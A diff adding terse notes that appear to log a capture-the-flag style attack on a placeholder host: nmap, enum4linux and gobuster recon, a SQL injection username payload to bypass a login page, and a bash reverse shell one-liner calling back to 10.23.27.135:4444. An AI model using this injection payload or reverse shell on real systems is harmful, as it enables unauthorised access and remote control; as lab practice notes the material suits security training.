@@ -1,0 +1,30 @@
+export IP=<IP>
+
+nmap scan
+nmap $IP -v -oN nmap.log -A
+
+enum scan
+enum4linux -a $IP -v
+
+-> failed
+
+
+gobuster scan
+gobuster dir -u http://$IP -w <directory mediun 2.3 > -t 100
+
+-> only /images(301) and /server-status(403)
+
+
+
+-> port 80 -> http website leads to login page
+
+-> admin;admin -> try sql injection for username
+' || 1=1;-- - -> as username
+
+
+-> we can see in url -> its reading file contents in from the input
+
+-> generate rev shell in bash from revshells[.]com
+-> sh -i >& /dev/tcp/10.23.27.135/4444 0>&1
+
+
